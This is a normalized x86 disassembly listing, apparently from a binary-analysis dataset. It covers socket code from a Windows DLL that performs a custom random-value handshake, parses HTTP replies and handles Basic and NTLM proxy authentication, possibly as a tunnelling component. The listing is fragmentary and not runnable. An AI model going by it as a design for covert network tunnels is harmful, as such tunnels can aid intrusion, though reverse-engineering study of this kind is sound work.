mov eax [ ebp - 0x90 ]
xor [ edi + ecx * 4 ] eax
mov eax [ ebp - 0x9c ]
lea edx [ eax - 0x15 ]
inc ecx
shr edx 0x2
cmp ecx edx
jb r-xdata
pop ecx
sub edi eax
jne r-xdata
cmp [ ebp - 0x8c ] 0x0
jne r-xdata
push [ ebp - 0x88 ]
call [ malloc@IAT ]
mov esi eax
pop ecx
test esi esi
je r-xdata
mov eax [ ebp - 0x9c ]
mov edx [ ebp - 0xa4 ]
lea ecx [ eax - 0x18 ]
mov [ edx ] ecx
mov ecx [ ebp - 0xa0 ]
mov edx [ ebp - 0xa8 ]
mov [ ecx ] edi
mov ecx [ ebp - 0x98 ]
mov [ edx ] ecx
jmp r-xdata
push [ ebp - 0x88 ]
push 0x0
push esi
call ebx
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
and [ ebp - 0xac ] 0x0
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x9c ]
push esi
add eax 0xffffffe8
mov ecx edi
call sub_1000ac2c
pop ecx
pop ecx
test eax eax
jne r-xdata
mov [ rw-data ] 0x1
push edi
mov edi [ free@IAT ]
call edi
push esi
call edi
pop ecx
mov ebx [ ebp - 0xac ]
cmp ebx [ ebp - 0x88 ]
jne r-xdata
push edi
call [ free@IAT ]
mov eax [ ebp - 0xa4 ]
mov [ eax ] ebx
mov eax [ ebp - 0xa0 ]
mov [ eax ] esi
mov eax [ ebp - 0x98 ]
pop ecx
mov ecx [ ebp - 0xa8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x9c ]
jmp r-xdata
sub_10007ab8
push ebp
mov ebp esp
sub esp 0x44
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx ]
mov edx eax
not edx
cmp [ ecx + 0x4 ] edx
jne r-xdata
xor eax eax
ror eax 0x7
cmp [ ecx + 0x8 ] eax
jne r-xdata
push edi
xor edi edi
call [ rand@IAT ]
mov [ ebp + edi * 4 - 0x44 ] eax
inc edi
cmp edi 0x10
jb r-xdata
mov eax [ ebp - 0x44 ]
mov ecx eax
ror eax 0x7
push 0x0
mov [ ebp - 0x3c ] eax
push 0x40
lea eax [ ebp - 0x44 ]
push eax
push [ esi + 0x10c ]
not ecx
mov [ ebp - 0x40 ] ecx
call [ send@IAT ]
pop edi
cmp eax 0x40
je r-xdata
mov eax [ esi + 0x10c ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1000eff2
leave
retn
sub_10007b33
push ebp
mov ebp esp
sub esp 0x404
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push r--data
push eax
xor esi esi
call [ strstr@IAT ]
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x4
push ebx
push r--data
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call [ _snprintf@IAT ]
add esp 0xc
push esi
mov esi [ strlen@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call esi
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push [ edi + 0x10c ]
call [ send@IAT ]
mov ebx eax
lea eax [ ebp - 0x404 ]
push eax
call esi
pop ecx
cmp ebx eax
pop ebx
je r-xdata
mov esi [ edi + 0x10c ]
or esi 0xffffffff
jmp r-xdata
sub_10007bcb
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi ecx
push edi
mov ebx esi
mov [ ebp - 0x40c ] esi
call sub_1000615c
mov edi eax
mov [ ebp - 0x408 ] edi
test edi edi
jle r-xdata
xor eax eax
push 0x2710
mov ecx edi
call sub_10005f68
pop ecx
test eax eax
jle r-xdata
push edi
call [ closesocket@IAT ]
push 0x0
push 0x100
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ recv@IAT ]
test eax eax
jle r-xdata
mov [ ebp + eax - 0x404 ] 0x0
cmp eax 0x40
jne r-xdata
xor eax eax
lea ecx [ ebp - 0x404 ]
call sub_10007ab8
jmp r-xdata
jle r-xdata
test eax eax
js r-xdata
mov ebx [ strlen@IAT ]
mov esi r--data
push esi
call ebx
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
xor eax eax
mov edi [ ebp - 0x40c ]
lea eax [ ebp - 0x404 ]
push eax
call sub_10007b33
mov edi [ ebp - 0x408 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
jle r-xdata
xor esi esi
cmp eax esi
jl r-xdata
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
pop ecx
pop ecx
lea eax [ ebp - 0x404 ]
push esi
push eax
call ebx
pop ecx
push eax
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ send@IAT ]
push esi
mov ecx edi
call sub_10005f68
pop ecx
test eax eax
je r-xdata
push esi
push 0x400
lea eax [ ebp - 0x404 ]
push eax
push edi
call [ recv@IAT ]
test eax eax
js r-xdata
jmp r-xdata
sub_10007d14
push ebx
push edi
xor ebx ebx
push 0x21c
lea eax [ esi + 0x8 ]
push ebx
push eax
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
call [ memset@IAT ]
mov edi 0x10118
push edi
call sub_10004aa8
add esp 0x10
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x8 ] bl
mov [ eax + 0x108 ] ebx
mov [ eax + 0x10c ] ebx
mov [ eax + 0x110 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
jmp r-xdata
xor eax eax
mov [ eax + 0x8 ] bl
mov [ eax + 0x108 ] ebx
mov [ eax + 0x10c ] ebx
mov [ eax + 0x110 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
jmp r-xdata
push edi
mov [ esi + 0x228 ] eax
call sub_10004aa8
pop ecx
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax + 0x8 ] bl
mov [ eax + 0x108 ] ebx
mov [ eax + 0x10c ] ebx
mov [ eax + 0x110 ] ebx
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
jmp r-xdata
push edi
mov [ esi + 0x22c ] eax
call sub_10004aa8
pop ecx
cmp eax ebx
je r-xdata
pop edi
mov [ esi + 0x224 ] eax
mov eax esi
pop ebx
retn
sub_10007dd6
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10007df5
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10004ae2
pop ecx
sub_10007df5
push esi
mov esi ecx
mov ecx [ esi + 0x224 ]
mov [ esi ] r--data
test ecx ecx
je r-xdata
mov ecx [ esi + 0x228 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
mov ecx [ esi + 0x22c ]
pop esi
test ecx ecx
je r-xdata
mov eax [ ecx ]
push 0x1
call [ eax ]
retn
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_10007e30
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ecx + 0x224 ]
mov [ edi + 0x108 ] eax
call sub_10005fc6
mov esi eax
test esi esi
jne r-xdata
mov eax [ edi + 0x108 ]
push eax
push eax
push esi
mov ecx edi
call sub_10006048
test eax eax
jns r-xdata
xor eax eax
jmp r-xdata
push 0xa
push esi
call [ listen@IAT ]
test eax eax
js r-xdata
call [ GetLastError@IAT ]
push esi
mov [ edi + 0x4 ] eax
call [ closesocket@IAT ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
mov [ edi + 0x110 ] esi
mov eax esi
sub_10007e94
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov edi ecx
mov ebx [ edi + 0x224 ]
mov [ ebp - 0x40c ] edi
call sub_1000615c
mov ebx eax
mov [ ebp - 0x408 ] ebx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn
mov eax [ edi + 0x228 ]
mov [ eax + 0x10c ] ebx
mov eax [ edi + 0x224 ]
and [ eax + 0x10c ] 0x0
push esi
mov esi [ edi + 0x228 ]
push 0x2710
call sub_10005dab
test eax eax
je r-xdata
mov eax [ edi + 0x228 ]
push 0x0
push 0x100
lea eax [ ebp - 0x404 ]
push eax
push ebx
call [ recv@IAT ]
test eax eax
jle r-xdata
mov esi [ edi + 0x228 ]
mov [ ebp + eax - 0x404 ] 0x0
cmp eax 0x40
jne r-xdata
xor eax eax
lea ecx [ ebp - 0x404 ]
call sub_10007ab8
jmp r-xdata
jle r-xdata
test eax eax
js r-xdata
mov ebx [ edi + 0x228 ]
mov esi r--data
push esi
call [ strlen@IAT ]
push eax
lea eax [ ebp - 0x404 ]
push esi
push eax
call [ strncmp@IAT ]
add esp 0x10
test eax eax
jne r-xdata
mov [ edi + 0x4 ] 0x20
mov eax ebx
jmp r-xdata
xor eax eax
lea eax [ ebp - 0x404 ]
push eax
mov edi ebx
call sub_10007b33
mov edi [ ebp - 0x40c ]
jmp r-xdata
pop esi
jle r-xdata
test eax eax
js r-xdata
lea eax [ ebp - 0x404 ]
push eax
mov ecx edi
call sub_1000841c
test eax eax
jns r-xdata
mov [ edi + 0x4 ] 0x30
jmp r-xdata
jle r-xdata
mov eax [ edi + 0x228 ]
call sub_10005e95
mov eax [ edi + 0x22c ]
jmp r-xdata
mov eax [ ebp - 0x408 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x404 ]
push 0x400
push eax
call [ _snprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call [ strlen@IAT ]
mov esi [ edi + 0x228 ]
add esp 0x10
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_100063f9
mov [ edi + 0x4 ] 0x60
call sub_10005e95
xor eax eax
sub_10008030
push ebp
mov ebp esp
mov eax 0x1894
call sub_1000faf0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0xc ]
mov esi ecx
mov ecx [ esi + 0x228 ]
mov edx [ ecx ]
push eax
mov [ ebp - 0x1890 ] eax
call [ edx + 0xc ]
test eax eax
je r-xdata
push ebx
mov ebx [ Sleep@IAT ]
push edi
mov edi 0x1388
push edi
call ebx
push [ ebp - 0x1890 ]
mov eax [ ebp + 0xc ]
call sub_1000827d
mov [ ebp - 0x188c ] eax
test eax eax
je r-xdata
mov ecx [ esi + 0x228 ]
mov ecx [ ecx + 0x114 ]
mov [ esi + 0x4 ] ecx
jmp r-xdata
push edi
call ebx
and [ ebp - 0x1888 ] 0x0
lea eax [ ebp - 0x1894 ]
push eax
lea eax [ ebp - 0x1888 ]
push eax
call sub_100073bf
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi + 0x4 ] 0x60
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_1000eff2
leave
retn 0x8
lea eax [ ebp - 0x1884 ]
push eax
call sub_1000ddbe
pop ecx
mov [ ebp - 0x1894 ] eax
test eax eax
je r-xdata
cmp [ ebp - 0x1894 ] 0xc4
mov edi [ ebp - 0x1888 ]
jne r-xdata
pop edi
pop ebx
and [ ebp - 0x1888 ] 0x0
test eax eax
je r-xdata
push edi
call [ free@IAT ]
pop ecx
lea eax [ edi + 0x84 ]
push eax
lea eax [ edi + 0x44 ]
push eax
push [ edi + 0x40 ]
push edi
push [ ebp + 0xc ]
push [ ebp - 0x1890 ]
call sub_1000831e
mov [ ebp - 0x188c ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x188c ]
lea edi [ ebp - 0x1840 ]
push edi
call [ free@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1888 ]
imul eax eax 0xc4
lea eax [ ebp + eax - 0x1884 ]
push eax
call sub_10007494
push 0x1388
call ebx
inc [ ebp - 0x1888 ]
mov eax [ ebp - 0x1888 ]
add edi 0xc4
cmp eax [ ebp - 0x1894 ]
jb r-xdata
mov [ esi + 0x4 ] 0x70
pop ecx
lea eax [ edi + 0x40 ]
push eax
push edi
push [ edi - 0x4 ]
lea eax [ edi - 0x44 ]
push eax
push [ ebp + 0xc ]
push [ ebp - 0x1890 ]
call sub_1000831e
mov [ ebp - 0x188c ] eax
test eax eax
jne r-xdata
jmp r-xdata
sub_100081c5
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0x4 ] eax
cmp eax 0x10
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000831e
test eax eax
je r-xdata
cmp eax 0x20
je r-xdata
push 0x1388
call [ Sleep@IAT ]
push [ ebp + 0x10 ]
mov eax [ esi ]
push [ ebp + 0xc ]
mov ecx esi
call [ eax + 0x30 ]
mov [ esi + 0x4 ] 0x70
jmp r-xdata
push [ ebp + 0x20 ]
mov ecx [ esi + 0x228 ]
push [ ebp + 0x1c ]
mov edx [ ecx ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call [ edx + 0x8 ]
jmp r-xdata
cmp eax 0x30
je r-xdata
pop esi
pop ebp
retn 0x1c
cmp eax 0x50
je r-xdata
cmp eax 0x60
je r-xdata
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_1000827d
jmp r-xdata
cmp eax 0x70
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1000831e
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000827d
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
and [ esi + 0x90 ] 0x0
push ebx
push edi
push 0x80
push [ ebp + 0x8 ]
lea ebx [ esi + 0xc ]
push ebx
mov edi eax
call [ strncpy@IAT ]
and [ esi + 0x8 ] 0x0
add esp 0xc
mov [ esi + 0x8c ] edi
mov eax edi
mov edi [ esi + 0x228 ]
push ebx
mov [ esi + 0x8b ] 0x0
call sub_1000625e
test eax eax
jle r-xdata
mov eax [ esi + 0x228 ]
call sub_10005e95
mov eax [ esi + 0x22c ]
call sub_10005e95
mov ecx esi
call sub_10008edb
test eax eax
jle r-xdata
mov eax [ esi + 0x8c ]
mov edi [ esi + 0x22c ]
push ebx
call sub_1000625e
test eax eax
jle r-xdata
push 0x0
mov edi esi
call sub_10008b42
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop ebx
leave
retn 0x4
sub_1000831e
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
and [ esi + 0x218 ] 0x0
push ebx
push edi
mov edi [ strncpy@IAT ]
mov ebx 0x80
push ebx
push [ ebp + 0x8 ]
lea eax [ esi + 0xc ]
push eax
mov [ esi + 0x90 ] 0x1
call edi
mov eax [ ebp + 0xc ]
push ebx
push [ ebp + 0x10 ]
mov [ esi + 0x8c ] eax
lea eax [ esi + 0x94 ]
push eax
mov [ esi + 0x8b ] 0x0
call edi
mov eax [ ebp + 0x14 ]
push ebx
push [ ebp + 0x18 ]
mov [ esi + 0x114 ] eax
lea eax [ esi + 0x118 ]
push eax
mov [ esi + 0x113 ] 0x0
call edi
push ebx
push [ ebp + 0x1c ]
lea eax [ esi + 0x198 ]
push eax
mov [ esi + 0x197 ] 0x0
call edi
mov eax [ esi + 0x114 ]
mov edi [ esi + 0x228 ]
and [ esi + 0x8 ] 0x0
add esp 0x30
lea ebx [ esi + 0x94 ]
push ebx
mov [ esi + 0x217 ] 0x0
call sub_1000625e
test eax eax
jle r-xdata
mov eax [ esi + 0x228 ]
call sub_10005e95
mov eax [ esi + 0x22c ]
call sub_10005e95
mov ecx esi
call sub_10008edb
test eax eax
jle r-xdata
mov eax [ esi + 0x114 ]
mov edi [ esi + 0x22c ]
push ebx
call sub_1000625e
test eax eax
jle r-xdata
push 0x0
mov edi esi
call sub_10008b42
test eax eax
jle r-xdata
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop ebx
leave
retn 0x18
sub_1000841c
push ebp
mov ebp esp
sub esp 0x40c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ strlen@IAT ]
push esi
push edi
mov edi ecx
mov esi r--data
push esi
mov [ ebp - 0x408 ] eax
mov [ edi + 0x8 ] 0x1
call ebx
push eax
push esi
push [ ebp - 0x408 ]
call [ strncmp@IAT ]
add esp 0x10
test eax eax
je r-xdata
mov eax [ edi + 0x228 ]
mov eax [ eax + 0x10c ]
push 0x100000
mov [ ebp - 0x40c ] eax
lea eax [ ebp - 0x404 ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x404 ]
push eax
call ebx
mov esi [ edi + 0x228 ]
add esp 0x10
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_100063f9
test eax eax
jns r-xdata
xor eax eax
jmp r-xdata
and [ ebp - 0x408 ] 0x0
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x4
push [ edi + 0x224 ]
call sub_10005d14
push [ edi + 0x228 ]
mov esi eax
call sub_10005d14
cmp esi eax
je r-xdata
push 0x32
call [ Sleep@IAT ]
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ edi + 0x224 ]
call sub_10005e95
inc [ ebp - 0x408 ]
cmp [ ebp - 0x408 ] 0x32
jl r-xdata
mov eax [ edi + 0x22c ]
mov [ eax + 0x10c ] ebx
mov eax [ edi + 0x224 ]
and [ eax + 0x10c ] 0x0
push 0x0
call sub_10008b42
test eax eax
js r-xdata
mov ebx [ edi + 0x224 ]
call sub_1000615c
mov ebx eax
test ebx ebx
jne r-xdata
mov eax 0x100000
mov [ edi + 0x220 ] eax
mov [ edi + 0x21c ] eax
mov eax [ ebp - 0x40c ]
sub_1000856e
push ebp
mov ebp esp
sub esp 0xd38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
and [ ebp - 0xd1c ] 0x0
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov [ ebp - 0xd20 ] eax
mov eax [ ebp + 0x14 ]
push 0x5
mov ebx ecx
mov [ ebp - 0xd28 ] eax
mov eax [ ebp + 0x18 ]
mov edi edx
push r--data
push ebx
mov [ ebp - 0xd2c ] ebx
mov [ ebp - 0xd34 ] edi
mov [ ebp - 0xd30 ] esi
mov [ ebp - 0xd24 ] eax
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x424153
jne r-xdata
mov [ ebp - 0xd1c ] 0x1
cmp [ ebp + 0xc ] 0x4e544c4d
jne r-xdata
push esi
mov esi [ _snprintf@IAT ]
push edi
push r--data
lea eax [ ebp - 0x494 ]
push 0x80
push eax
call esi
mov edi [ strlen@IAT ]
add esp 0x14
lea eax [ ebp - 0x514 ]
push eax
lea eax [ ebp - 0x494 ]
push eax
mov [ ebp - 0x415 ] 0x0
call edi
pop ecx
lea ecx [ ebp - 0x494 ]
call sub_100050c6
pop ecx
lea eax [ ebp - 0x514 ]
push eax
push ebx
push r--data
lea eax [ ebp - 0x414 ]
push 0x400
push eax
call esi
lea eax [ ebp - 0x414 ]
add esp 0x14
push eax
call edi
mov esi [ ebp - 0xd20 ]
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push eax
call sub_100063f9
test eax eax
jns r-xdata
xor eax eax
inc eax
lea eax [ ebp - 0x914 ]
push eax
call sub_100066d4
pop ecx
lea ecx [ ebp - 0xd14 ]
push ecx
lea ecx [ ebp - 0x914 ]
call sub_100050c6
pop ecx
lea eax [ ebp - 0xd14 ]
push eax
push ebx
push r--data
lea eax [ ebp - 0x414 ]
push 0x400
push eax
call [ _snprintf@IAT ]
mov edi [ strlen@IAT ]
add esp 0x14
cmp [ ebp - 0xd1c ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0xd1c ] eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
lea eax [ ebp - 0x414 ]
push eax
call edi
mov esi [ ebp - 0xd20 ]
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push eax
call sub_100063f9
test eax eax
js r-xdata
lea eax [ ebp - 0x414 ]
push r--data
push eax
call [ strstr@IAT ]
mov ebx r--data
push ebx
mov esi eax
call edi
add esp 0xc
push eax
push ebx
push esi
call [ memcpy@IAT ]
add esp 0xc
mov ecx [ ebp - 0xd24 ]
or [ ecx ] 0xffffffff
mov esi [ strcmp@IAT ]
mov [ ebp - 0xd1c ] eax
mov [ ebp - 0xd18 ] eax
mov eax [ ebp - 0xd28 ]
mov [ eax ] 0xc8
mov ecx [ ebp - 0x8 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x14
and [ ebp - 0xd18 ] 0x0
mov esi r--data
lea eax [ ebp - 0x414 ]
push eax
call edi
pop ecx
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x414 ]
push eax
call edi
pop ecx
cmp eax 0x2
jb r-xdata
mov ebx r--data
lea eax [ ebp - 0x414 ]
push ebx
push eax
call edi
pop ecx
lea ecx [ ebp - 0x414 ]
sub ecx 0x2
add eax ecx
push eax
call esi
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x414 ]
push r--data
push eax
call edi
mov ebx [ strcmp@IAT ]
pop ecx
lea ecx [ ebp - 0x414 ]
sub ecx 0x2
add eax ecx
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x414 ]
push ebx
push eax
call esi
pop ecx
pop ecx
test eax eax
je r-xdata
lea eax [ ebp - 0x414 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0xd1c ]
mov ecx [ ebp - 0xd28 ]
mov [ ecx ] eax
xor ecx ecx
cmp eax 0xc8
sete cl
lea eax [ ecx + ecx - 0x1 ]
jmp r-xdata
cmp [ ebp - 0xd18 ] 0x0
jne r-xdata
cmp [ ebp - 0xd18 ] 0x0
je r-xdata
push esi
call edi
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push esi
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push ebx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x414 ]
push r--data
push eax
call ebx
add esp 0xc
test eax eax
je r-xdata
lea eax [ ebp - 0x914 ]
push r--data
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ebx [ ebp - 0xd20 ]
lea eax [ ebp - 0x414 ]
push eax
mov eax 0x400
call sub_1000646d
test eax eax
jle r-xdata
push esi
call edi
pop ecx
lea ecx [ ebp - 0x914 ]
lea eax [ ebp + eax - 0x414 ]
push ecx
call sub_100051b5
pop ecx
mov [ ebp - 0xd18 ] eax
jmp r-xdata
inc [ ebp - 0xd18 ]
jmp r-xdata
push ebx
call edi
pop ecx
lea eax [ ebp + eax - 0x414 ]
push eax
call [ atoi@IAT ]
pop ecx
mov ecx [ ebp - 0xd24 ]
mov [ ecx ] eax
lea eax [ ebp - 0x40b ]
push eax
call [ atoi@IAT ]
pop ecx
mov [ ebp - 0xd1c ] eax
push 0x9
lea eax [ ebp - 0x414 ]
push r--data
push eax
call ebx
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x90c ] 0x2
jne r-xdata
mov ebx [ ebp - 0xd20 ]
lea eax [ ebp - 0x414 ]
push eax
mov eax 0x400
call sub_1000646d
test eax eax
jle r-xdata
push 0x8
lea eax [ ebp - 0x8fc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call [ memcpy@IAT ]
mov ecx [ ebp - 0xd30 ]
add esp 0xc
push [ ebp - 0xd34 ]
lea eax [ ebp - 0x914 ]
push eax
lea edx [ ebp - 0x10 ]
call sub_10006771
lea ecx [ ebp - 0xd14 ]
push ecx
lea ecx [ ebp - 0x914 ]
call sub_100050c6
add esp 0xc
lea eax [ ebp - 0xd14 ]
push eax
push [ ebp - 0xd2c ]
lea eax [ ebp - 0x414 ]
push r--data
push 0x400
push eax
call [ _snprintf@IAT ]
lea eax [ ebp - 0x414 ]
add esp 0x14
push eax
call edi
mov esi [ ebp - 0xd20 ]
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push eax
call sub_100063f9
test eax eax
js r-xdata
xor eax eax
cmp [ ebp - 0xd1c ] eax
jne r-xdata
mov ecx [ ebp - 0xd24 ]
or [ ecx ] 0xffffffff
mov [ ebp - 0xd1c ] eax
mov [ ebp - 0xd18 ] eax
lea eax [ ebp - 0x414 ]
sub eax 0x2
mov [ ebp - 0xd2c ] eax
lea eax [ ebp - 0x414 ]
push eax
call edi
pop ecx
cmp eax 0x2
jb r-xdata
mov esi r--data
lea eax [ ebp - 0x414 ]
push esi
push eax
call edi
add eax [ ebp - 0xd2c ]
mov ebx [ strcmp@IAT ]
pop ecx
push eax
call ebx
pop ecx
pop ecx
test eax eax
jne r-xdata
lea eax [ ebp - 0x414 ]
push esi
push eax
call ebx
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0xd18 ] 0x0
jne r-xdata
mov ebx r--data
push ebx
call edi
pop ecx
push eax
lea eax [ ebp - 0x414 ]
push ebx
push eax
call [ _strnicmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ strncmp@IAT ]
push 0x9
lea eax [ ebp - 0x414 ]
push r--data
push eax
call ebx
add esp 0xc
test eax eax
je r-xdata
inc [ ebp - 0xd18 ]
jmp r-xdata
push ebx
call edi
pop ecx
lea eax [ ebp + eax - 0x414 ]
push eax
call [ atoi@IAT ]
pop ecx
mov ecx [ ebp - 0xd24 ]
mov [ ecx ] eax
lea eax [ ebp - 0x40b ]
push eax
call [ atoi@IAT ]
pop ecx
mov [ ebp - 0xd1c ] eax
push 0x9
lea eax [ ebp - 0x414 ]
push r--data
push eax
call ebx
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ ebp - 0xd20 ]
lea eax [ ebp - 0x414 ]
push eax
mov eax 0x400
call sub_1000646d
test eax eax
jle r-xdata
sub_10008b42
push ebp
mov ebp esp
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
cmp [ edi + 0x8 ] 0x1
push ebx
push esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ebx [ strlen@IAT ]
mov ebx [ edi + 0x22c ]
lea eax [ ebp - 0x40c ]
push eax
mov eax 0x400
call sub_1000646d
test eax eax
jle r-xdata
mov ebx [ edi + 0x22c ]
lea eax [ ebp - 0x40c ]
push eax
mov eax 0x3ff
call sub_1000646d
test eax eax
js r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ sprintf@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call [ strlen@IAT ]
mov esi [ edi + 0x22c ]
add esp 0xc
push eax
lea eax [ ebp - 0x40c ]
push eax
call sub_100063f9
test eax eax
jg r-xdata
push [ edi + 0x8c ]
lea eax [ edi + 0xc ]
push eax
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ sprintf@IAT ]
add esp 0x14
lea eax [ ebp - 0x40c ]
push eax
call ebx
pop ecx
jmp r-xdata
mov eax [ edi + 0x8c ]
push eax
lea ecx [ edi + 0xc ]
push ecx
push eax
push ecx
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ sprintf@IAT ]
mov eax [ edi + 0x218 ]
add esp 0x1c
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi [ strncmp@IAT ]
push 0xf
lea eax [ ebp - 0x40c ]
push r--data
push eax
call esi
add esp 0xc
test eax eax
je r-xdata
mov esi r--data
push esi
call [ strlen@IAT ]
pop ecx
push eax
lea eax [ ebp - 0x40c ]
push esi
push eax
call [ strncmp@IAT ]
add esp 0xc
test eax eax
jne r-xdata
mov esi [ edi + 0x22c ]
push eax
lea eax [ ebp - 0x40c ]
push eax
call sub_100063f9
test eax eax
jg r-xdata
lea eax [ ebp - 0x40c ]
push r--data
push eax
call [ strcat@IAT ]
lea eax [ ebp - 0x40c ]
push eax
call ebx
add esp 0xc
and [ ebp - 0x410 ] 0x0
or [ ebp - 0x414 ] 0xffffffff
lea ecx [ ebp - 0x414 ]
push ecx
lea ecx [ ebp - 0x410 ]
push ecx
lea ecx [ edi + 0x198 ]
push ecx
push eax
push [ edi + 0x22c ]
lea edx [ edi + 0x118 ]
lea ecx [ ebp - 0x40c ]
call sub_1000856e
test eax eax
js r-xdata
mov ecx [ ebp - 0x8 ]
pop esi
xor ecx ebp
pop ebx
call sub_1000eff2
leave
retn 0x4
mov esi r--data
push 0xf
lea eax [ ebp - 0x40c ]
